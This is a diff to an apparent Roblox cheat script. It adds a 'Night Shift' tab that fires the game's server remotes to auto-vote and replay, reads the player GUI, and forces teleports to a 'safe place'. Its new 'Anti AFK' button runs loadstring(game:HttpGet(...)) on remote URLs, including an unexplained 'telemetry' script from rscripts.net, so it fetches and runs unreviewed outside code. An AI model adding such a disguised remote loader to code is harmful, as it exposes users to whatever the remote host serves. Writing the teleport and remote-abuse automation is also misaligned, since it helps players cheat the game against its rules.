@@ -272,7 +272,7 @@ end
 local function pos(h) return h:IsA("BasePart") and h.Position or h:GetPivot().Position end
 
 -- everything starts OFF
-local F = {Farm = false, AutoStart = false, Candy = false, Skill = false, Black = false}
+local F = {Farm = false, AutoStart = false, Candy = false, Skill = false, Black = false, AutoAgain = false, AutoVote = false, SafeTP = false}
 local sid, conn, swap = 0, nil, false
 local function alive(i) return F.Farm and sid == i end
 
@@ -476,7 +476,7 @@ local content = new("Frame", {Position = UDim2.fromOffset(SB + 8, 8), Size = UDi
 local selector = themed(new("Frame", {Size = UDim2.new(1, -16, 0, 30), Position = UDim2.fromOffset(8, 8), BorderSizePixel = 0}, sidebar), "BackgroundColor3", "accent")
 round(selector, 6)
 
-local TABS = {"Main", "Player", "Icons", "Theme"}
+local TABS = {"Main", "Night Shift", "Player", "Icons", "Theme"}
 local pages, sfs, tabBtns = {}, {}, {}
 for idx, name in ipairs(TABS) do
     local cg = new("CanvasGroup", {Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, BorderSizePixel = 0, Visible = false}, content)
@@ -489,12 +489,12 @@ for idx, name in ipairs(TABS) do
     pages[name], sfs[name] = cg, sf
 
     local b = new("TextButton", {
-        Size = UDim2.new(1, -16, 0, 30), Position = UDim2.fromOffset(8, 8 + (idx - 1) * 36), BackgroundTransparency = 1,
+        Size = UDim2.new(1, -16, 0, 30), Position = UDim2.fromOffset(8, 8 + (idx - 1) * 34), BackgroundTransparency = 1,
         BorderSizePixel = 0, Text = name, Font = Enum.Font.GothamBold, TextSize = 13, TextColor3 = T.sub, AutoButtonColor = false,
     }, sidebar)
     tabBtns[name] = b
 end
-local pMain, pPlayer, pIcons, pTheme = sfs.Main, sfs.Player, sfs.Icons, sfs.Theme
+local pMain, pNight, pPlayer, pIcons, pTheme = sfs.Main, sfs["Night Shift"], sfs.Player, sfs.Icons, sfs.Theme
 
 local currentTab = "Main"
 local function showTab(name, anim)
@@ -641,9 +641,94 @@ toggle(pMain, "Auto Start (tp + Start)", "AutoStart")
 toggle(pMain, "Monster Candy swap", "Candy")
 toggle(pMain, "Skill (E) every few sec", "Skill")
 toggle(pMain, "Black screen behind UI", "Black", function() syncBlack() end)
-button(pMain, "Instant join Night Shift", function()
+slider(pMain, "Teleport distance", 3, 15, 1, function() return S.Stop end, function(v) S.Stop = v end)
+slider(pMain, "Skill delay (s)", 2, 20, 1, function() return S.SDelay end, function(v) S.SDelay = v end)
+label(pMain, "Weapon = hotbar slot 1 (auto equip)")
+label(pMain, "RightShift = hide / show")
+
+-- ===== NIGHT SHIFT tab =====
+local NS = {Delay = 3, Pause = 0}
+local SAFE = CFrame.new(1203, 403, -1085)
+local warnedNight = false
+
+local function nightAction(...)
+    local args = {...}
+    pcall(function()
+        game:GetService("ReplicatedStorage").NightRemotes.Action:FireServer(unpack(args))
+    end)
+end
+
+-- is o (and everything between it and root) actually visible?
+local function shown(o, root)
+    while o and o ~= root do
+        if o:IsA("GuiObject") and not o.Visible then return false end
+        o = o.Parent
+    end
+    return true
+end
+
+-- a night box counts as locked if it has a visible "lock" object inside, a Locked attribute, or a disabled button
+local function isLocked(box)
+    if box:GetAttribute("Locked") == true then return true end
+    if box:IsA("GuiButton") and (not box.Active or box.Interactable == false) then return true end
+    for _, d in ipairs(box:GetDescendants()) do
+        if d:IsA("GuiObject") then
+            local nm = d.Name:lower()
+            if nm:find("lock") and not nm:find("unlock") and shown(d, box) then
+                if not (d:IsA("ImageLabel") or d:IsA("ImageButton")) or d.ImageTransparency < 1 then
+                    return true
+                end
+            end
+        end
+    end
+    return false
+end
+
+-- highest night that is unlocked, counting up from 1 until the first locked night
+local function highestNight()
+    local pg = pl:FindFirstChild("PlayerGui")
+    if not pg then return nil end
+    local seen, locked = {}, {}
+    for _, d in ipairs(pg:GetDescendants()) do
+        if d:IsA("GuiObject") then
+            local n, box = d.Name:match("^[Nn]ight[%s_]*(%d)$"), d
+            if not n and (d:IsA("TextLabel") or d:IsA("TextButton")) then
+                n = d.Text:match("^%s*[Nn][Ii][Gg][Hh][Tt]%s*(%d)%s*$")
+                if n and not d:IsA("TextButton") then box = d.Parent end
+            end
+            n = tonumber(n)
+            if n and n >= 1 and n <= 6 and box then
+                seen[n] = true
+                if isLocked(box) then locked[n] = true end
+            end
+        end
+    end
+    local best
+    for n = 1, 6 do
+        if not seen[n] or locked[n] then break end
+        best = n
+    end
+    return best
+end
+
+local nsId = {again = 0, vote = 0, safe = 0}
+local function nsLoop(key, flag, fn)
+    nsId[key] += 1
+    local id = nsId[key]
     task.spawn(function()
-        -- teleport to the join spot first
+        while F[flag] and nsId[key] == id and gui.Parent do
+            fn()
+            task.wait(NS.Delay)
+        end
+    end)
+end
+
+label(pNight, "Night Shift", "text")
+
+-- 1) instant join (teleports to the join spot first)
+button(pNight, "Instant join Night Shift", function()
+    NS.Pause = os.clock() + 4 -- pause the safe-place teleport so it doesn't pull you back mid-join
+    task.spawn(function()
         local c = pl.Character
         local r = c and c:FindFirstChild("HumanoidRootPart")
         if r then
@@ -654,10 +739,70 @@ button(pMain, "Instant join Night Shift", function()
         pcall(function() Ev:FireServer(buf(B.join), {}) end)
     end)
 end)
-slider(pMain, "Teleport distance", 3, 15, 1, function() return S.Stop end, function(v) S.Stop = v end)
-slider(pMain, "Skill delay (s)", 2, 20, 1, function() return S.SDelay end, function(v) S.SDelay = v end)
-label(pMain, "Weapon = hotbar slot 1 (auto equip)")
-label(pMain, "RightShift = hide / show")
+
+-- 2) auto play again
+toggle(pNight, "Auto play again", "AutoAgain", function(on)
+    if on then nsLoop("again", "AutoAgain", function() nightAction("Vote", "Again") end) end
+end)
+
+-- 3) auto vote the highest unlocked night (1-6)
+toggle(pNight, "Auto vote highest night", "AutoVote", function(on)
+    if on then
+        warnedNight = false
+        nsLoop("vote", "AutoVote", function()
+            local n = highestNight()
+            if n then
+                nightAction("Pick", n)
+            elseif not warnedNight then
+                warnedNight = true
+                warn("Auto vote: couldn't read the night buttons - press 'Print vote UI' and send me the output")
+            end
+        end)
+    end
+end)
+
+-- 4) auto teleport to the safe place (keeps you there, re-teleports if you get moved)
+toggle(pNight, "Auto teleport to safe place", "SafeTP", function(on)
+    if on then
+        nsId.safe += 1
+        local id = nsId.safe
+        task.spawn(function()
+            while F.SafeTP and nsId.safe == id and gui.Parent do
+                if os.clock() >= NS.Pause then
+                    local r = pl.Character and pl.Character:FindFirstChild("HumanoidRootPart")
+                    if r and (r.Position - SAFE.Position).Magnitude > 8 then
+                        r.AssemblyLinearVelocity = Vector3.zero
+                        r.CFrame = SAFE
+                    end
+                end
+                task.wait(.5)
+            end
+        end)
+    end
+end)
+
+slider(pNight, "Loop delay (s)", 1, 10, 1, function() return NS.Delay end, function(v) NS.Delay = v end)
+
+-- debug: prints every night / lock related GUI object + which night would be voted
+button(pNight, "Print vote UI (debug)", function()
+    local pg = pl:FindFirstChild("PlayerGui")
+    if not pg then return end
+    local count = 0
+    for _, d in ipairs(pg:GetDescendants()) do
+        if d:IsA("GuiObject") then
+            local nm = d.Name:lower()
+            local tx = (d:IsA("TextLabel") or d:IsA("TextButton")) and d.Text or ""
+            if nm:find("night") or nm:find("lock") or tx:lower():find("night") then
+                count += 1
+                if count <= 200 then
+                    print(d:GetFullName(), d.ClassName, "Visible=" .. tostring(d.Visible), tx ~= "" and ('Text="' .. tx .. '"') or "")
+                end
+            end
+        end
+    end
+    print("[Night Shift] matches: " .. count .. " | highest unlocked night: " .. tostring(highestNight()))
+end)
+label(pNight, "Votes 1-6, stops at the first locked night")
 
 -- ===== PLAYER tab =====
 local prof = themed(new("Frame", {Size = UDim2.new(1, 0, 0, 84), BorderSizePixel = 0, LayoutOrder = nextOrd()}, pPlayer), "BackgroundColor3", "card")
@@ -681,6 +826,23 @@ i1.Text = "Account age: " .. pl.AccountAge .. " days"
 local gameName = "Unknown"
 pcall(function() gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
 i2.Text = "Game: " .. gameName
+
+-- Anti AFK (loads once)
+local afkLoaded = false
+local afkBtn
+afkBtn = button(pPlayer, "Anti AFK", function()
+    if afkLoaded then return end
+    afkLoaded = true
+    afkBtn.Text = "Anti AFK (loaded)"
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://rscripts.net/api/telemetry/client.lua?s=66de7d638fb72e485f5cde56"))()
+        end)
+    end)
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()
+    end)
+end)
 
 -- ===== ICONS tab =====
 label(pIcons, "Changes the HUD PlayerIcon (only you see it)", "sub")
